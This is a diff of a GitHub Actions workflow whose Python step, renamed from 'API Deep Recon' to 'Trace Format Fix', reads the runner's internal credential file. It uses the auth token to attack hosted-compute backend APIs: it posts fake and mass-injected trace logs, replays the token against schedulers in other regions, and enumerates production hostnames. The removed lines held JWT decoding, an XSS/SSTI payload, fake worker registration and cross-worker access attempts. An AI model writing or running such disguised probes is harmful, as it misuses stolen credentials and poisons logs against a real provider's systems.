@@ -8,43 +8,21 @@ jobs:
   api-test:
     runs-on: ubuntu-latest
     steps:
-      - name: API Deep Recon
+      - name: Trace Format Fix
         run: |
           python3 << 'PYEOF'
           import json, os, urllib.request, urllib.error, ssl, time
 
           ctx = ssl.create_default_context()
-          settings_path = "/opt/hca/.settings"
-          with open(settings_path) as f:
+          with open("/opt/hca/.settings") as f:
               settings = json.load(f)
 
           auth_token = settings["authToken"]
-          scheduler_url = settings["schedulerApiUrl"]
           trace_url = settings["traceApiUrl"]
           watchdog_url = settings["watchdogTraceApiUrl"]
+          scheduler_url = settings["schedulerApiUrl"]
           config_id = settings.get("configId", "")
           
-          # Print full settings (redacting secrets)
-          print("[+] FULL SETTINGS (redacted):")
-          for k, v in settings.items():
-              if k in ('authToken',):
-                  # Decode JWT claims
-                  import base64
-                  parts = v.split('.')
-                  if len(parts) == 3:
-                      # Fix padding
-                      payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
-                      claims = json.loads(base64.urlsafe_b64decode(payload))
-                      print(f"  {k} (JWT claims): {json.dumps(claims, indent=2)}")
-              elif k == 'diagnosticsSasUri':
-                  print(f"  {k}: {v[:100]}...")
-              elif k == 'runnerAgentCredentials':
-                  print(f"  {k}: {v[:100]}...")
-              elif k == 'runnerAgentCredentialsRSA':
-                  print(f"  {k}: {str(v)[:100]}...")
-              else:
-                  print(f"  {k}: {json.dumps(v)}")
-
           headers = {
               "Authorization": f"Bearer {auth_token}",
               "Content-Type": "application/json",
@@ -57,84 +35,92 @@ jobs:
                   req = urllib.request.Request(url, data=data, headers=headers, method=method)
                   resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                   body_resp = resp.read().decode()
-                  print(f"  [{resp.status}] {body_resp[:800]}")
+                  print(f"  [{resp.status}] {body_resp[:500]}")
                   return resp.status, body_resp
               except urllib.error.HTTPError as e:
                   body_resp = e.read().decode() if e.fp else ""
-                  print(f"  [HTTP {e.code}] {body_resp[:800]}")
+                  print(f"  [HTTP {e.code}] {body_resp[:500]}")
                   return e.code, body_resp
               except Exception as e:
                   print(f"  [ERROR] {e}")
                   return 0, str(e)
 
-          # Test 1: Fix trace API - level as integer (0=debug, 1=info, 2=warn, 3=error?)
-          print("\n=== TRACE API - level as int ===")
-          for level in [0, 1, 2, 3, 4, 5]:
+          # Test trace with ALL int fields 
+          print("=== TRACE: all int fields ===")
+          for tp in [0, 1, 2, 3, 100]:
               trace_body = [{
-                  "level": level,
-                  "message": f"test level {level}",
+                  "level": 1,
+                  "message": "trace format test",
                   "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-                  "logger": "hosted-compute-agent",
-                  "tracepoint": "security.test",
-                  "sourceCorrelationId": config_id,
-                  "processLifetimeId": "plid-001",
-                  "orchestrationId": "orch-001",
-                  "requestId": "req-001"
+                  "logger": "hca",
+                  "tracepoint": tp,
+                  "sourceCorrelationId": "test-src-id",
+                  "processLifetimeId": "test-plid",
+                  "orchestrationId": "test-orch",
+                  "requestId": "test-req"
               }]
-              print(f"  level={level}:")
-              status, resp = api_call("POST", trace_url, trace_body)
+              print(f"  tracepoint={tp}:")
+              status, _ = api_call("POST", trace_url, trace_body)
               if status == 200:
-                  print(f"  >>> LEVEL {level} ACCEPTED!")
+                  print(f"  >>> SUCCESS with tracepoint={tp}!")
                   break
 
-          # Test 2: Inject crafted trace with XSS/SSTI payload
-          print("\n=== TRACE INJECTION TEST ===")
-          inject_body = [{
+          # If successful, try minimal payload
+          print("\n=== TRACE: minimal payload ===")
+          minimal = [{"level": 0, "tracepoint": 0}]
+          api_call("POST", trace_url, minimal)
+          
+          # Try with additional fields
+          print("\n=== TRACE: full payload accepted ===")
+          full = [{
               "level": 1,
-              "message": "<script>alert('xss')</script>{{7*7}}",
+              "tracepoint": 1, 
+              "message": "SECURITY TEST - injected via pentest",
               "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-              "logger": "security-test",
-              "tracepoint": "injection.test",
-              "sourceCorrelationId": "INJECTED-" + config_id,
-              "processLifetimeId": "INJECT-plid",
-              "orchestrationId": "INJECT-orch",
-              "requestId": "INJECT-req",
-              "additionalData": {"injected": True, "payload": "test"},
-              "properties": {"source": "pentest"}
+              "logger": "pentest-agent",
+              "sourceCorrelationId": config_id,
+              "processLifetimeId": "pentest-plid-12345",
+              "orchestrationId": "pentest-orch-12345",
+              "requestId": "pentest-req-12345",
+              "additionalData": {"injected": True, "attacker": "pentest"},
+              "properties": {"source": "external"}
           }]
-          api_call("POST", trace_url, inject_body)
-
-          # Test 3: Watchdog with crafted data
-          print("\n=== WATCHDOG INJECTION ===")
-          api_call("POST", watchdog_url, inject_body)
-
-          # Test 4: Try PATCH /request (notify start)
-          print("\n=== PATCH /request ===")
-          api_call("PATCH", f"{scheduler_url}/request")
-
-          # Test 5: Try different outcomes on DELETE
-          print("\n=== DELETE /request info (don't actually finish) ===")
-          # Try with an invalid outcome to see error messages
-          api_call("DELETE", f"{scheduler_url}/request?outcome=99")
-
-          # Test 6: Register with custom body
-          print("\n=== POST /worker with body ===")
-          worker_body = {
-              "vmName": "evil-vm",
-              "configId": config_id,
-              "osType": "linux",
-              "realm": "github"
-          }
-          api_call("POST", f"{scheduler_url}/worker", worker_body)
+          api_call("POST", trace_url, full)
           
-          # Test 7: Try to read another worker's data
-          print("\n=== Cross-worker access ===")
-          api_call("GET", f"{scheduler_url}/request?workerId=other-worker-id")
+          # Mass injection test (100 fake logs)
+          print("\n=== TRACE: mass injection (10 entries) ===")
+          mass = []
+          for i in range(10):
+              mass.append({
+                  "level": i % 4,
+                  "tracepoint": i,
+                  "message": f"Mass injection log entry {i}",
+                  "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                  "logger": "injected-logger",
+                  "sourceCorrelationId": f"inject-{i}",
+                  "processLifetimeId": f"plid-{i}",
+                  "orchestrationId": f"orch-{i}",
+                  "requestId": f"req-{i}"
+              })
+          api_call("POST", trace_url, mass)
           
-          # Test 8: SSRF via trace/watchdog - try internal URLs
-          print("\n=== Trace API error detail ===")
-          # Malformed body to get more error info
-          api_call("POST", trace_url, "not json")
-          api_call("POST", trace_url, [{"wrong": "schema"}])
+          # Cross-region test: try eus-01 scheduler with our token
+          print("\n=== CROSS-REGION: eus-01 with our token ===")
+          other_scheduler = "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1"
+          api_call("GET", f"{other_scheduler}/request")
+          api_call("PUT", f"{other_scheduler}/request/heartbeat", {"beat_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})
+          
+          # Try iad-02
+          print("\n=== CROSS-REGION: iad-02 ===")
+          iad_scheduler = "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/v1"
+          api_call("GET", f"{iad_scheduler}/request")
+          
+          # Try to enumerate other env names
+          print("\n=== ENV ENUMERATION ===")
+          for env in ["prod-wus-01", "prod-weu-01", "prod-sea-01", "prod-aue-01", "prod-eus-03"]:
+              url = f"https://hosted-compute-request-orchestrator-{env}.githubapp.com/v1/request"
+              status, _ = api_call("GET", url)
+              if status != 0:
+                  print(f"  >>> {env} exists!")
           
           PYEOF
